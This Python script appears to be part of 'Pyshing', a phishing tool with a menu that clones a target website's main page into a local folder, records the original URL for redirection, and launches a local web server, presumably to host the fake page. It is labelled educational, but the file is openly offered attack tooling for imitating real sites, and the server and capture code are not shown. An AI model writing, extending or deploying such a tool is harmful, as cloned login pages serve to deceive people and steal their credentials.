#!/usr/bin/python
'''
Name: Pyshing v1.3
Version: Python 3.7.4
-
The tool is for educational purposes
-
https://github.com/r4msolo
Author: R4MSOLO
'''
import core.server
import urllib.request

class Pyshing():
    def __init__(self):
        print(options)
        opt = int(input(BOLD+RED+"[pyshing]# "+ENDC))
        if opt == 1:
        	self.pageClone()
        elif opt == 2:
        	core.server.SimpleHTTPRequestHandler.run()
        elif opt == 0:
            quit()
        else:
            print(RED+"[!] Invalid option!\n")

    def pageClone(self):
    	try:
    		url = str(input(BOLD+BLUE+"URL clone: "+ENDC))
    		contents = urllib.request.urlopen(url).read()
    		contents = contents.decode('UTF-8')
    		file = open('site/index.html','w')
    		file.write(contents)
    		file.close()
    		print(BOLD+GREEN+"[+] Main page copied... "+ENDC)
    		del contents
    		file = open('site/redirect.txt', 'w')
    		file.write(url)
    		file.close()
    	except OSError:
    		print(RED+"[!] Error, check your internet connection\n"+ENDC)
    	Pyshing()

'''colors'''
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
BOLD = '\033[1m'
ENDC = '\033[0m'

banner = BLUE+'''
                                ,,          ,,                        
`7MM"""Mq.                    `7MM          db                        
  MM   `MM.                     MM                                    
  MM   ,M9 `7M'   `MF',pP"Ybd   MMpMMMb.  `7MM  `7MMpMMMb.   .P"Ybmmm 
  MMmmdM9    VA   ,V  8I   `"   MM    MM    MM    MM    MM  :MI  I8   
  MM          VA ,V   `YMMMa.   MM    MM    MM    MM    MM   WmmmP"   
  MM           VVV    L.   I8   MM    MM    MM    MM    MM  8M        
.JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
              ,V                                            6'     dP 
           OOb"                                             Ybmmmd'  
                                             Version: 1.3
                                             Author: R4MSOLO\n
'''+ENDC

options = BOLD+GREEN+'''
1) Clone a Website	2) Start Server
0) Exit
'''+ENDC

if __name__ == '__main__':
    try:
        print(banner)
        Pyshing()
    except KeyboardInterrupt:
        print("[!] Finished...\n")